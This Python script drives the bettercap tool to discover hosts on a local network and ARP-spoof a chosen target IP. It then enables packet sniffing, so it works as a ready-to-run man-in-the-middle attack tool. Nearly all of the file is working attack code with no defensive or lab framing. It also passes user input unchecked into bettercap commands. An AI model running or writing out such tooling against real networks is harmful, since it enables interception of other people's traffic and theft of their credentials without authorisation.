import subprocess
import sys
import time
import threading

def main():
    if len(sys.argv) < 2:
        print(f"Usage: python {sys.argv[0]} <network_interface>")
        sys.exit(1)
    iface = sys.argv[1]

    # Start bettercap process
    print(f"[*] Starting bettercap on interface {iface}...")
    proc = subprocess.Popen(
        ["bettercap", "-iface", iface],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1
    )

    def send(cmd):
        proc.stdin.write(cmd + "\n")
        proc.stdin.flush()

    # Step 1: net.probe on
    send("net.probe on")
    print("[*] Sent 'net.probe on'. Waiting for devices to be discovered (30 seconds)...")
    time.sleep(30)

    # Step 2: net.show
    send("net.show")
    print("\n[*] Output of 'net.show':\n")

    # Read output in a separate thread until user presses Enter
    stop_reading = False

    def read_output():
        while not stop_reading:
            line = proc.stdout.readline()
            if not line:
                break
            print(line, end="")

    t = threading.Thread(target=read_output)
    t.start()

    input("\n[*] Press Enter when you are ready to continue...")

    stop_reading = True
    t.join(timeout=2)

    # Step 3: ask user for ARP spoof options
    fullduplex = input("\nEnter fullduplex value (true/false): ").strip().lower()
    target_ip = input("Enter target IP: ").strip()

    # Step 4: execute arp spoof commands
    send(f"set arp.spoof.fullduplex {fullduplex}; set arp.spoof.targets {target_ip}; arp.spoof on")
    print(f"\n[*] Sent: set arp.spoof.fullduplex {fullduplex}; set arp.spoof.targets {target_ip}; arp.spoof on\n")
    send(f"net.sniff on")
    print("[*] You are now in the interactive bettercap session. Press Ctrl+C to exit.")

    # Attach to bettercap process (interactive)
    try:
        while True:
            line = proc.stdout.readline()
            if not line:
                break
            print(line, end="")
    except KeyboardInterrupt:
        print("\nExiting...")
        proc.terminate()

if __name__ == "__main__":
    main()
